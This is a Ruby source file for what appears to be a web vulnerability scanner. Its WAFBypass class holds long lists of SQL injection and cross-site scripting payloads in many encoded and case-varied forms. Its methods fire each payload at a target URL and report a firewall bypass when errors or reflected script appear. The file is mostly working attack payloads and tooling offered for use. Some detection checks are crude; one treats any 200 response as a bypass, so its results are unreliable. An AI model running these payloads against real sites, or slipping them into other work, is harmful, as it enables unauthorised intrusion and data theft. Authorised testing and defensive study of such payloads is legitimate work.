require 'uri'
require 'base64'
require_relative '../utils/network'
require_relative '../utils/colorize'

class WAFBypass
  SQLI_BYPASS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR 'x'='x",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR ('x'='x",
    "' OR 1=1 LIMIT 1--",
    "' OR '1'='1' UNION SELECT NULL--",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1' OR '1'='1'#",
    "' OR 1=1",
    "' OR '1'='1",
    "') OR ('1'='1",
    "1') OR ('1'='1",
    "1') OR ('1'='1'--",
    "1') OR ('1'='1'/*",
    "1') OR ('1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "'/**/OR/**/1=1--",
    "'/**/OR/**/1=1#",
    "'/**/OR/**/1=1/*",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'/**/UNION/**/SELECT/**/1,2,3--",
    "'/**/UNION/**/ALL/**/SELECT/**/NULL--",
    "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
    "'%0AOR%0A1=1--",
    "'%0AOR%0A1=1#",
    "'%0AOR%0A1=1/*",
    "'%0AUNION%0ASELECT%0ANULL--",
    "'%0AUNION%0ASELECT%0A1,2,3--",
    "'%0AUNION%0AALL%0ASELECT%0ANULL--",
    "'%0AUNION%0AALL%0ASELECT%0A1,2,3--",
    "'%09OR%091=1--",
    "'%09OR%091=1#",
    "'%09OR%091=1/*",
    "'%09UNION%09SELECT%09NULL--",
    "'%09UNION%09SELECT%091,2,3--",
    "'%09UNION%09ALL%09SELECT%09NULL--",
    "'%09UNION%09ALL%09SELECT%091,2,3--",
    "'%0DOR%0D1=1--",
    "'%0DOR%0D1=1#",
    "'%0DOR%0D1=1/*",
    "'%0DUNION%0DSELECT%0DNULL--",
    "'%0DUNION%0DSELECT%0D1,2,3--",
    "'%0DUNION%0DALL%0DSELECT%0DNULL--",
    "'%0DUNION%0DALL%0DSELECT%0D1,2,3--",
    "'%20OR%201=1--",
    "'%20OR%201=1#",
    "'%20OR%201=1/*",
    "'%20UNION%20SELECT%20NULL--",
    "'%20UNION%20SELECT%201,2,3--",
    "'%20UNION%20ALL%20SELECT%20NULL--",
    "'%20UNION%20ALL%20SELECT%201,2,3--",
    "'%2FOR%2F1=1--",
    "'%2FOR%2F1=1#",
    "'%2FOR%2F1=1/*",
    "'%2FUNION%2FSELECT%2FNULL--",
    "'%2FUNION%2FSELECT%2F1,2,3--",
    "'%2FUNION%2FALL%2FSELECT%2FNULL--",
    "'%2FUNION%2FALL%2FSELECT%2F1,2,3--",
    "'%2AOR%2A1=1--",
    "'%2AOR%2A1=1#",
    "'%2AOR%2A1=1/*",
    "'%2AUNION%2ASELECT%2ANULL--",
    "'%2AUNION%2ASELECT%2A1,2,3--",
    "'%2AUNION%2AALL%2ASELECT%2ANULL--",
    "'%2AUNION%2AALL%2ASELECT%2A1,2,3--",
    "'%2BOR%2B1=1--",
    "'%2BOR%2B1=1#",
    "'%2BOR%2B1=1/*",
    "'%2BUNION%2BSELECT%2BNULL--",
    "'%2BUNION%2BSELECT%2B1,2,3--",
    "'%2BUNION%2BALL%2BSELECT%2BNULL--",
    "'%2BUNION%2BALL%2BSELECT%2B1,2,3--",
    "'%2COR%2C1=1--",
    "'%2COR%2C1=1#",
    "'%2COR%2C1=1/*",
    "'%2CUNION%2CSELECT%2CNULL--",
    "'%2CUNION%2CSELECT%2C1,2,3--",
    "'%2CUNION%2CALL%2CSELECT%2CNULL--",
    "'%2CUNION%2CALL%2CSELECT%2C1,2,3--",
    "'%3DOR%3D1=1--",
    "'%3DOR%3D1=1#",
    "'%3DOR%3D1=1/*",
    "'%3DUNION%3DSELECT%3DNULL--",
    "'%3DUNION%3DSELECT%3D1,2,3--",
    "'%3DUNION%3DALL%3DSELECT%3DNULL--",
    "'%3DUNION%3DALL%3DSELECT%3D1,2,3--",
    "'%3EOR%3E1=1--",
    "'%3EOR%3E1=1#",
    "'%3EOR%3E1=1/*",
    "'%3EUNION%3ESELECT%3ENULL--",
    "'%3EUNION%3ESELECT%3E1,2,3--",
    "'%3EUNION%3EALL%3ESELECT%3ENULL--",
    "'%3EUNION%3EALL%3ESELECT%3E1,2,3--",
    "'%3FOR%3F1=1--",
    "'%3FOR%3F1=1#",
    "'%3FOR%3F1=1/*",
    "'%3FUNION%3FSELECT%3FNULL--",
    "'%3FUNION%3FSELECT%3F1,2,3--",
    "'%3FUNION%3FALL%3FSELECT%3FNULL--",
    "'%3FUNION%3FALL%3FSELECT%3F1,2,3--",
    "'%40OR%401=1--",
    "'%40OR%401=1#",
    "'%40OR%401=1/*",
    "'%40UNION%40SELECT%40NULL--",
    "'%40UNION%40SELECT%401,2,3--",
    "'%40UNION%40ALL%40SELECT%40NULL--",
    "'%40UNION%40ALL%40SELECT%401,2,3--",
    "'%5COR%5C1=1--",
    "'%5COR%5C1=1#",
    "'%5COR%5C1=1/*",
    "'%5CUNION%5CSELECT%5CNULL--",
    "'%5CUNION%5CSELECT%5C1,2,3--",
    "'%5CUNION%5CALL%5CSELECT%5CNULL--",
    "'%5CUNION%5CALL%5CSELECT%5C1,2,3--",
    "'%7COR%7C1=1--",
    "'%7COR%7C1=1#",
    "'%7COR%7C1=1/*",
    "'%7CUNION%7CSELECT%7CNULL--",
    "'%7CUNION%7CSELECT%7C1,2,3--",
    "'%7CUNION%7CALL%7CSELECT%7CNULL--",
    "'%7CUNION%7CALL%7CSELECT%7C1,2,3--",
    "'%7EOR%7E1=1--",
    "'%7EOR%7E1=1#",
    "'%7EOR%7E1=1/*",
    "'%7EUNION%7ESELECT%7ENULL--",
    "'%7EUNION%7ESELECT%7E1,2,3--",
    "'%7EUNION%7EALL%7ESELECT%7ENULL--",
    "'%7EUNION%7EALL%7ESELECT%7E1,2,3--"
  ]

  XSS_BYPASS = [
    "<script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(/XSS/)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<Img src=x onerror=alert('XSS')>",
    "<IMG src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<SvG onload=alert('XSS')>",
    "<SVG onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "JaVaScRiPt:alert('XSS')",
    "JAVASCRIPT:alert('XSS')",
    "'\"><script>alert('XSS')</script>",
    "'\"><ScRiPt>alert('XSS')</ScRiPt>",
    "'\"><SCRIPT>alert('XSS')</SCRIPT>",
    "<body onload=alert('XSS')>",
    "<BoDy onload=alert('XSS')>",
    "<BODY onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<IfRaMe src=javascript:alert('XSS')>",
    "<IFRAME src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<InPuT onfocus=alert('XSS') autofocus>",
    "<INPUT onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<SeLeCt onfocus=alert('XSS') autofocus>",
    "<SELECT onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<TeXtArEa onfocus=alert('XSS') autofocus>",
    "<TEXTAREA onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<KeYgEn onfocus=alert('XSS') autofocus>",
    "<KEYGEN onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<ViDeO><source onerror=alert('XSS')>",
    "<VIDEO><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<AuDiO src=x onerror=alert('XSS')>",
    "<AUDIO src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<DeTaIlS open ontoggle=alert('XSS')>",
    "<DETAILS open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<MaRqUeE onstart=alert('XSS')>",
    "<MARQUEE onstart=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<ObJeCt data=javascript:alert('XSS')>",
    "<OBJECT data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<EmBeD src=javascript:alert('XSS')>",
    "<EMBED src=javascript:alert('XSS')>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<LiNk rel=stylesheet href=javascript:alert('XSS')>",
    "<LINK rel=stylesheet href=javascript:alert('XSS')>",
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<StYlE>@import'javascript:alert(\"XSS\")';</StYlE>",
    "<STYLE>@import'javascript:alert(\"XSS\")';</STYLE>",
    "<style>body{-moz-binding:url(\"javascript:alert('XSS')\")}</style>",
    "<StYlE>body{-moz-binding:url(\"javascript:alert('XSS')\")}</StYlE>",
    "<STYLE>body{-moz-binding:url(\"javascript:alert('XSS')\")}</STYLE>",
    "<div style=background-image:url(javascript:alert('XSS'))>",
    "<DiV style=background-image:url(javascript:alert('XSS'))>",
    "<DIV style=background-image:url(javascript:alert('XSS'))>",
    "<div style=width:expression(alert('XSS'))>",
    "<DiV style=width:expression(alert('XSS'))>",
    "<DIV style=width:expression(alert('XSS'))>",
    "<table background=javascript:alert('XSS')>",
    "<TaBlE background=javascript:alert('XSS')>",
    "<TABLE background=javascript:alert('XSS')>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<IsInDeX type=image src=1 onerror=alert('XSS')>",
    "<ISINDEX type=image src=1 onerror=alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>",
    "<FoRm><button formaction=javascript:alert('XSS')>",
    "<FORM><button formaction=javascript:alert('XSS')>",
    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<MaTh><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<MATH><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">"
  ]

  def self.test_sqli_bypass(url)
    vulnerable = false
    
    SQLI_BYPASS.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        body_lower = response.body.downcase
        if body_lower.include?("sql") || body_lower.include?("mysql") || body_lower.include?("error") || body_lower.include?("syntax")
          puts Colorize.red("WAF bypass successful: #{payload[0..50]}...")
          vulnerable = true
          break
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_xss_bypass(url)
    vulnerable = false
    
    XSS_BYPASS.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.include?(payload) || response.body.include?("<script>") || response.body.include?("alert('XSS')")
          puts Colorize.red("WAF bypass successful: #{payload[0..50]}...")
          vulnerable = true
          break
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_encoding_bypass(url, payload)
    encodings = [
      payload,
      URI.encode_www_form_component(payload),
      payload.unpack('H*').first,
      payload.bytes.map { |b| "\\x#{b.to_s(16).rjust(2, '0')}" }.join,
      payload.bytes.map { |b| "%#{b.to_s(16).rjust(2, '0')}" }.join,
      payload.bytes.map { |b| "&#x#{b.to_s(16).rjust(2, '0')};" }.join,
      payload.bytes.map { |b| "&##{b};" }.join,
      Base64.encode64(payload).strip,
      payload.chars.map { |c| "&#{c.ord};" }.join,
      payload.chars.map { |c| "&#x#{c.ord.to_s(16)};" }.join
    ]
    
    encodings.each do |encoded|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{encoded}" : "#{url}?test=#{encoded}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.code == "200" && response.body.length > 0
          puts Colorize.green("Encoding bypass: #{encoded[0..50]}...")
          return true
        end
      rescue
      end
    end
    
    false
  end
end

